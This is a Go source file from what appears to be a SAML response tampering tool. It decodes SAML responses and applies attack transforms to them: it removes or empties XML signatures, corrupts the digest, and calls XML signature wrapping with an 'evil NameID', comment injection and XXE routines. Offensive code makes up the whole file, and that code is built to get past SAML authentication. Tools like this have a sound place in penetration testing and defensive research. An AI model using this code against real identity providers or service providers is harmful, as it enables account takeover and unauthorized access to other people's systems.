package saml

import (
	"encoding/base64"
	"fmt"
	"log/slog"
	"strings"

	"github.com/beevik/etree"
)

func TransformSAMLResponse(samlResponseB64 string, config *TamperConfig, logger *slog.Logger) (string, []TamperModification, error) {
	config.mu.RLock()
	sigMode := config.SignatureMode
	xswVariant := config.XSWVariant
	xswNameID := config.XSWNameID
	xxeEnabled := config.XXEEnabled
	xxeType := config.XXEType
	xxeTarget := config.XXETarget
	xxePlacement := config.XXEPlacement
	xxeCustom := config.XXECustom
	commentInjection := config.CommentInjection
	commentPosition := config.CommentPosition
	config.mu.RUnlock()

	xmlBytes, err := base64.StdEncoding.DecodeString(samlResponseB64)
	if err != nil {
		return "", nil, fmt.Errorf("transform: base64 decode failed: %w", err)
	}

	var mods []TamperModification

	if strings.Contains(string(xmlBytes), "<saml:EncryptedAssertion") || strings.Contains(string(xmlBytes), "<EncryptedAssertion") {
		if xswVariant != "" || commentInjection {
			logger.Warn("skipping XSW/comment injection: assertion is encrypted")
			xswVariant = ""
			commentInjection = false
		}
	}

	if sigMode != "" {
		xmlBytes, err = applySignatureMode(xmlBytes, sigMode)
		if err != nil {
			return "", nil, fmt.Errorf("transform: signature mode failed: %w", err)
		}
		mods = append(mods, TamperModification{
			Field:    "Signature",
			OldValue: "present",
			NewValue: "mode: " + sigMode,
		})
	}

	if xswVariant != "" {
		xmlBytes, err = ApplyXSW(xmlBytes, xswVariant, xswNameID)
		if err != nil {
			return "", nil, fmt.Errorf("transform: XSW failed: %w", err)
		}
		mods = append(mods, TamperModification{
			Field:    "XSW",
			OldValue: "none",
			NewValue: xswVariant + " (evil NameID: " + xswNameID + ")",
		})
	}

	if commentInjection {
		xmlBytes, err = ApplyCommentInjection(xmlBytes, commentPosition)
		if err != nil {
			return "", nil, fmt.Errorf("transform: comment injection failed: %w", err)
		}
		mods = append(mods, TamperModification{
			Field:    "Comment Injection",
			OldValue: "none",
			NewValue: fmt.Sprintf("injected at position %d", commentPosition),
		})
	}

	if xxeEnabled {
		xmlBytes, err = ApplyXXE(xmlBytes, xxeType, xxeTarget, xxePlacement, xxeCustom)
		if err != nil {
			return "", nil, fmt.Errorf("transform: XXE failed: %w", err)
		}
		mods = append(mods, TamperModification{
			Field:    "XXE",
			OldValue: "none",
			NewValue: xxeType + " (" + xxeTarget + ")",
		})
	}

	encoded := base64.StdEncoding.EncodeToString(xmlBytes)
	return encoded, mods, nil
}

func applySignatureMode(xmlBytes []byte, mode string) ([]byte, error) {
	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(xmlBytes); err != nil {
		return nil, fmt.Errorf("signature mode: parse failed: %w", err)
	}

	response := doc.Root()
	if response == nil {
		return nil, fmt.Errorf("signature mode: no root element")
	}

	assertion := findElement(response, "saml", "Assertion")

	switch mode {
	case "remove_response":
		removeSignature(response)
	case "remove_both":
		removeSignature(response)
		if assertion != nil {
			removeSignature(assertion)
		}
	case "empty_value":
		emptySigValue(response)
		if assertion != nil {
			emptySigValue(assertion)
		}
	case "invalid_digest":
		corruptDigest(response)
		if assertion != nil {
			corruptDigest(assertion)
		}
	default:
		return nil, fmt.Errorf("signature mode: unknown mode %q", mode)
	}

	return doc.WriteToBytes()
}

func emptySigValue(el *etree.Element) {
	sig := findSignature(el)
	if sig == nil {
		return
	}
	sigValue := findElement(sig, "ds", "SignatureValue")
	if sigValue != nil {
		sigValue.SetText("")
	}
}

func corruptDigest(el *etree.Element) {
	sig := findSignature(el)
	if sig == nil {
		return
	}
	signedInfo := findElement(sig, "ds", "SignedInfo")
	if signedInfo == nil {
		return
	}
	ref := findElement(signedInfo, "ds", "Reference")
	if ref == nil {
		return
	}
	digestValue := findElement(ref, "ds", "DigestValue")
	if digestValue != nil {
		digestValue.SetText("AAAA" + digestValue.Text())
	}
}
